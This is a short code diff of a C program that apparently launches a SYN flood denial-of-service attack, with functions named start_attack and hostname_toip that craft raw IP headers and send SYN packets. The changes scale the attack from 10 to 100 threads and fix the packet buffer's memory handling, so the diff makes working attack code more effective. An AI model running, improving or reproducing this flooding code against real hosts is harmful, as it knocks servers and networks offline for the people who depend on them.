@@ -65,7 +65,7 @@ int main(int argc, char *argv[])
         return 1;
     }
 
-    for(int i = 0; i < 10; i++)
+    for(int i = 0; i < 100; i++)
     {
         start_attack(ip_array);
         printf("Thread %d started.\n", i);
@@ -151,7 +151,8 @@ void start_attack(char *argv[])
     }
 
     //Zero out the packet memory area
-    //memset(packet_to_send, 0, 4096);
+    bzero(packet_to_send, 60);
+    //memset(packet_to_send, 0, 60);
     //Fill in the IP header
     iph.ip_hl = 5;
     iph.ip_v = 4;
@@ -208,7 +209,8 @@ void start_attack(char *argv[])
         fprintf(stderr, "Error sending syn packet! Error message: %s\n", strerror(errno));
         exit(1);
     }
-    }
+    free(packet_to_send);
+}
 
 void hostname_toip(char *dst, struct in_addr *dst_ip)
 {
